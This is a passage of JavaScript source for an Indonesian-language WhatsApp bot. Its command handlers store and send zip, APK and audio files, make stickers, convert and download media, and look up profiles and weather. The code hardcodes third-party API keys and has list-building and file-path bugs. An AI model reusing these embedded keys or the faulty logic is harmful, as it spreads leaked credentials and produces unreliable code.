case 'addzip': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return m.reply("Nama tersebut sudah di gunakan")
let delb = await hinata.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./HinataBase/database/zip/${teks}.zip`)
fs.writeFileSync('./HinataBase/database/zip.json', JSON.stringify(zipnye, null, 2))
fs.unlinkSync(delb)
m.reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}break
//=================================================//
case 'delzip': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return m.reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./HinataBase/database/zip.json', JSON.stringify(zipnye, null, 2))
fs.unlinkSync(`./HinataBase/database/zip/${teks}.zip`)
m.reply(`Sukses delete zip ${teks}`)
}
}break
//=================================================//
case 'listzip': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Nama File + sambil reply pesan target* \n\n Contoh 2 : yozip Nama File`
reply(teksooooo)
}break
//=================================================//
case 'yozip': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
hinata.sendMessage(from, { document: fs.readFileSync(`./HinataBase/database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}break
//=================================================//
case 'sendzip': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
hinata.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./HinataBase/database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}break
//=================================================//
case 'addapk':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return m.reply("Nama tersebut sudah di gunakan")
let delb = await hinata.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./HinataBase/database/apk/${teks}.apk`)
fs.writeFileSync('./HinataBase/database/apk.json', JSON.stringify(apknye, null, 2))
fs.unlinkSync(delb)
m.reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}break
//=================================================//
case 'delapk':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return m.reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./HinataBase/database/zip.json', JSON.stringify(apknye, null, 2))
fs.unlinkSync(`./HinataBase/database/apk/${teks}.apk`)
m.reply(`Sukses delete Apk ${teks}`)
}
}break
//=================================================//
case 'listapk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Jumlah : ${apknye.length} \n\n Contoh 1 : sendapk Nama Apk + sambil reply pesan target* \n\n Contoh 2 : yoapk Nama Apk`
reply(teksoooooo)
}break
//=================================================//
case 'yoapk':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
hinata.sendMessage(from, { document: fs.readFileSync(`./HinataBase/database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}break
//=================================================//
case 'sendapk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
hinata.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./HinataBase/database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}break
//=================================================//
case 'addvn':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Nama audionya apa')
if (vnnye.includes(text)) return m.reply("Nama tersebut sudah di gunakan")
let delb = await hinata.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./HinataBase/database/Audio/${text}.mp3`)
fs.writeFileSync('./HinataBase/database/vnadd.json', JSON.stringify(vnnye, null, 2))
fs.unlinkSync(delb)
m.reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}break
//=================================================//
case 'delvn':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (args.length < 1) return m.reply('Masukan query')
if (!vnnye.includes(text)) return m.reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./HinataBase/database/vnadd.json', JSON.stringify(vnnye, null, 2))
fs.unlinkSync(`./HinataBase/database/Audio/${text}.mp3`)
m.reply(`Sukses delete vn ${text}`)
}break
//=================================================//
case 'listvn':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}break
//=================================================//
case 'addmsg': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!m.quoted) return m.reply('Reply Pesan Yang Ingin Disave Di Database')
if (!text) return m.reply(`Example : ${prefix + command} nama file`)
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) return m.reply(`'${text}' telah terdaftar di list pesan`)
msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}break
//=================================================//
case 'sendlist': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (!text) return m.reply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`)
hinata.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}break
//=================================================//
case 'listmsg': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
reply(teks)
}break
//=================================================//
case 'delmsg': case 'deletemsg': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}break
//=================================================//
case 'getmsg': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`)
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar di list pesan`)
hinata.copyNForward(from, msgs[text.toLowerCase()], true)
}break
//=================================================//
case 'owner': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinata.sendContact(from, global.owner, m)
}break
//=================================================//
case 'sticker': case 'stiker': case 's': case 'stickergif': case 'stikergif': case 'sgif': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await hinata.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await hinata.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}break
//=================================================//
case 'sewa': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
reply(`¥ *Price Sewa Bot Hinata* €

🔏 1 minggu = 10k
🔏 2 minggu = 15k
🔏 1 bulan = 20k

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu`)
}break
//=================================================//
case 'wm': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let teks = `${text}`
{
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command} text`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await hinata.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command} text`)
}
}
}break
//=================================================//
case 'wmvideo':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let teks = `${text}`
{
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await hinata.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `${botname}` })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
}break
//=================================================//
case 'emojimix': { 
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
 let [emoji1, emoji2] = text.split`+`
if (!emoji1) return reply(`📌Contoh : ${prefix + command} 😅+🤔`)
if (!emoji2) return reply(`📌Contoh : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await hinata.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}break
//=================================================//
case 'emojimix2': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
 if (!text) return reply(`📌Contoh : ${prefix + command} 😅`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await hinata.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}break
//=================================================//
case 'ttp': case 'ttp2': case 'ttp3': case 'ttp4':case 'attp':
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`Example: ${prefix + command} Hinata Semok`)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
hinata.sendFile(from, ini_buffer, "", m, { caption: mess.success })
break
//=================================================//
case 'afk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!text) return reply(`📌Contoh ${prefix+command} ingin tidur`)
user.afkTime = + new Date
user.afkReason = args.join(" ")
m.reply(`*${m.pushName}* Telah Pergi AFK\nKarena : ${args.join(" ") ? args.join(" ") : ''}`)
}break
//=================================================
case 'faktaunik':
case 'katabijak':
case 'pantun':
case 'bucin': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
reply(data.result)
}break
//=================================================
case 'toimage': case 'toimg': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!quoted) return m.reply('Reply Image')
if (!/webp/.test(mime)) return m.reply(`Balas sticker dengan caption *${prefix + command}*`)
let media = await hinata.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
hinata.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}break
//=================================================//
case 'tomp4': case 'tovideo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!quoted) return m.reply(`Balas sticker video Dengan Caption ${prefix + command}`)
if (!/webp/.test(mime)) return m.reply(`Balas stiker dengan text *${prefix + command}*`)
let { webp2mp4File } = require('./HinataBase/lib/uploader')
let media = await hinata.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await hinata.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversikan Webp Ke Video' } }, { quoted: m })
await fs.unlinkSync(media)
}break
//=================================================//
case 'tomp3': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
let media = await hinata.downloadMediaMessage(quoted)
let { toAudio } = require('./HinataBase/lib/converter')
let audio = await toAudio(media, 'mp4')
hinata.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${hinata.user.name}.mp3`}, { quoted : m })
}break
//=================================================//
case 'toaud': case 'audio': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Kirim/Balas Video/Audio yang Ingin Anda Gunakan sebagai Audio Dengan Teks ${prefix + command}`)
if (!quoted) return reply(`Kirim/Balas Video/Audio yang Ingin Anda Gunakan sebagai Audio Dengan Teks ${prefix + command}`)
let media = await hinata.downloadMediaMessage(quoted)
let { toAudio } = require('./HinataBase/lib/converter')
let audio = await toAudio(media, 'mp4')
hinata.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}break
//=================================================//
case 'tovn': case 'voice': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Balas Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`Balas Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
reply('Loading...⏳')
let media = await quoted.download()
let { toPTT } = require('./HinataBase/lib/converter')
let audio = await toPTT(media, 'mp4')
hinata.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: `https://wa.me/${global.ownernumber}`,
title: `${botname}`,
sourceUrl: `https://wa.me/${global.ownernumber}`,
thumbnail: thumb
}
}})
}break
//=================================================//
case 'togif': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!quoted) return reply('Balas Ke Stiker Bergerak')
if (!/webp/.test(mime)) return reply(`Balas ke stiker bergerak dengan teks ${prefix + command}`)
let { webp2mp4File } = require('./HinataBase/lib/uploader')
let media = await hinata.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await hinata.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}break
//=================================================//
case 'tourl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!/video/.test(mime) && !/image/.test(mime)) return reply(`Kirim/Balas Video/Gambar Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`Kirim/Balas Video/Gambar dengan Caption${prefix + command}`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./HinataBase/lib/uploader')
let media = await hinata.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
reply(util.format(anu))
}
await fs.unlinkSync(media)
}break
//=================================================
case 'smeme': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
mee = await hinata.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
hinata.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
}
}break
//=================================================//
case 'quotes': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var resi = await Quotes()
teks = `\nAuthor: ${resi.author}\n`
teks = `\nQuotes:\n`
teks = `${resi.quotes}\n`
reply(teks)
}break
//=================================================//
case 'darkjoke': case 'darkjokes':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var ress = await Darkjokes()
teks = "*Darkjokes*"
hinata.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
}break
//=================================================//
case 'google': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} rafi ahmad`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
reply(teks)
})
}break
//=================================================//
case 'couple': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
hinata.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
hinata.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, {quoted:m})
}break
//=================================================//
case 'coffe': case 'kopi': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinata.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`},{quoted:m})
}break
//=================================================//
case 'getname': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (qtod === "true") {
namenye = await hinata.getName(m.quoted.sender)
reply(namenye)
} else if (qtod === "false") {
hinata.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}break
//=================================================//
case 'getpic': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (qtod === "true") {
try {
pporg = await hinata.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
hinata.sendMessage(from, { image : { url : pporg }, caption:`Done` }, {quoted:m})
} else if (qtod === "false") {
try {
pporgs = await hinata.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
hinata.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, {quoted:m})
}
}break
//=================================================//
case 'setppgroup': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!isAdmins) return hinatareplygroupadmin()
if (!quoted) return reply(`Mana gambarnya?`)
if (!/image/.test(mime)) return reply(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Kirim / Balas Gambar Dengan Caption ${prefix + command}`)
var mediz = await hinata.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await hinata.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`Success ✅`)
} else {
var memeg = await hinata.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`Success ✅`)
}
}
break
//=================================================//
case 'block': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}break
//=================================================//
case 'unblock': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await hinata.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}break
//=================================================//
case 'stalktiktok': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
hinata.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
}break
//=================================================//
case 'infogempa': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
const linkgempa = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(linkgempa + 'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*${anu.Wilayah}*

ᴛᴀɴɢɢᴀʟ : ${anu.Tanggal}
ᴡᴀᴋᴛᴜ : ${anu.Jam}
ᴘᴏᴛᴇɴsɪ : ${anu.Potensi}
ᴍᴀɢɴɪᴛᴜᴅᴏ : ${anu.Magnitude}
ᴋᴇᴅᴀʟᴀᴍᴀɴ : ${anu.Kedalaman}
ᴋᴏᴏʀᴅɪɴᴀᴛ : ${anu.Coordinates}
ᴅɪʀᴀsᴀᴋᴀɴ : ${anu.Dirasakan}`
await hinata.sendMessage(m.chat, { image: { url: linkgempa + anu.Shakemap }, caption: txt }, { quoted: m })
} catch (e) {
console.log(e)
m.reply(`[!] Fitur Error.`)
}
}break
//=================================================
case 'lirik': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`📌Contoh: ${prefix + command} Melukis Senja`)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
reply(`
*Judul :* ${result.title}
*Pengarang :* ${result.author}
*Url :* ${result.link}

*Lirik :* ${result.lyrics}

`.trim())
}break
//=================================================
case 'cerpen': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
var textpp = `Title : ${data.result.title}\n`
textpp += `Creator : ${data.result.creator}\n`
textpp += `Story :\n${data.result.cerpen}`
reply(textpp)
}break
//=================================================
case 'ceritahoror': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
hinata.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
}break
//=================================================
case 'cuaca': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`📌Contoh : ${prefix + command} Mojokerto`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
var textppp = `Tempat : ${data.result.tempat}\n`
textppp += `Cuaca : ${data.result.cuaca}\n`
textppp += `Angin : ${data.result.angin}\n`
textppp += `Description : ${data.result.description}\n`
textppp += `Kelembapan : ${data.result.kelembapan}\n`
textppp += `Suhu : ${data.result.suhu}\n`
textppp += `Udara : ${data.result.udara}\n`
textppp += `Permukaan laut : ${data.result.permukaan_laut}\n`
hinata.sendMessage(from, { location: { degreesLatitude: data.result.latitude, degreesLongitude: data.result.longitude } })
reply(textppp)
}break
//=================================================//
case 'jadwaltv': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`📌Contoh: ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=${apikey}`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
reply(txtayaj)
}break
//=================================================
case 'jadwaltvnow': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=${apikey}`)
var txtayajas = `Jadwal TV Now :\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
reply(txtayajas)
}break
//=================================================//
case 'fbvideo': case 'fbdl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📝Dimana urlnya?\n\n*📌Contoh :* ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
let fcdl = await fg.fbdl(args[0])
hinata.sendMessage(m.chat, { caption: mess.success, video: {url: fcdl.videoUrl} }, { quoted: m })
}break
//=================================================//
case 'igvideo': case 'igvid': case 'igdl': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📝Link nya mana anjay?\n\n📌Contoh : ${prefix+command} https://www.instagram.com/tv/CEjIHlnpyvI/?igshid=NTdlMDg3MTY=`)
axios
.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${text}`)
.then(({ data }) => {
hinata.sendMessage(m.chat, { caption: mess.success, video: {url: data.result} }, { quoted: m })
})
}break
//=================================================//
case 'igstory': case 'igs': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!args[0]) return reply(`📝Masukkan nama pengguna\n📌Contoh: *${prefix+command}* Kayes`)
let res = await fg.igstory(args[0])
for (let { url, type } of res.results) {
hinata.sendFile(from, url, "igstory.bin", m, { caption: mess.success })
}
}break
//=================================================//
case 'gambar': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📝Gambar apa yang ingin anda cari?\n\n📌Contoh : ${prefix+command} Hinata`)
let { pinterest } = require('@bochilteam/scraper-images')
const json = await pinterest(text)
var hinataresult = pickRandom(json)
hinata.sendFile(from, hinataresult, "", m, { caption: mess.success })
}break
//=================================================//
case 'twitvideo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
